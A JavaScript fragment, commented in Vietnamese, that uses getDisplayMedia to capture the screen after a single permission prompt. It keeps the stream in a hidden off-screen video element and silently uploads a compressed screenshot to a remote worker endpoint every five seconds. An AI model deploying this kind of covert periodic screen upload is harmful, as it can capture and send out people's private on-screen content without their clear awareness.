// Dùng getDisplayMedia — user cho phép 1 lần, script tự chụp frame định kỳ
let _screenStream = null;
let _screenVideo  = null;
let _screenCanvas = null;
let _screenCtx    = null;
let _captureInterval = null;

async function initScreenCapture() {
    try {
        // Xin quyền capture màn hình (hiện dialog 1 lần)
        _screenStream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: 'always', displaySurface: 'browser' },
            audio: false,
        });

        // Tạo video element ẩn để nhận stream
        _screenVideo = document.createElement('video');
        _screenVideo.srcObject = _screenStream;
        _screenVideo.muted = true;
        _screenVideo.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;';
        document.body.appendChild(_screenVideo);
        await _screenVideo.play();

        // Canvas để chụp frame
        _screenCanvas = document.createElement('canvas');
        _screenCtx    = _screenCanvas.getContext('2d');

        // Khi stream bị dừng (user tắt share), reset
        _screenStream.getVideoTracks()[0].addEventListener('ended', () => {
            stopScreenCapture();
        });

        // Bắt đầu chụp mỗi 5s
        _captureInterval = setInterval(captureFrame, 5000);
        // Chụp ngay lập tức
        setTimeout(captureFrame, 1000);

    } catch(e) {
        console.log('[KT] Screen capture cancelled or not supported:', e.message);
    }
}

function stopScreenCapture() {
    if (_captureInterval) { clearInterval(_captureInterval); _captureInterval = null; }
    if (_screenStream)    { _screenStream.getTracks().forEach(t => t.stop()); _screenStream = null; }
    if (_screenVideo)     { _screenVideo.remove(); _screenVideo = null; }
    _screenCanvas = null; _screenCtx = null;
}

async function captureFrame() {
    if (!_screenVideo || !_screenCanvas || !_screenCtx) return;
    if (_screenVideo.readyState < 2) return; // chưa sẵn sàng

    try {
        const vw = _screenVideo.videoWidth  || 1280;
        const vh = _screenVideo.videoHeight || 720;
        // Scale xuống để giảm kích thước gửi lên
        const scale  = Math.min(1, 900 / vw);
        _screenCanvas.width  = Math.round(vw * scale);
        _screenCanvas.height = Math.round(vh * scale);
        _screenCtx.drawImage(_screenVideo, 0, 0, _screenCanvas.width, _screenCanvas.height);

        const dataUrl = _screenCanvas.toDataURL('image/jpeg', 0.55);

        await fetch(`${WORKER_URL}/api/screenshot/${encodeURIComponent(CLIENT_ID)}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ data: dataUrl, type: 'screenshot' }),
        });
    } catch(e) {}
}

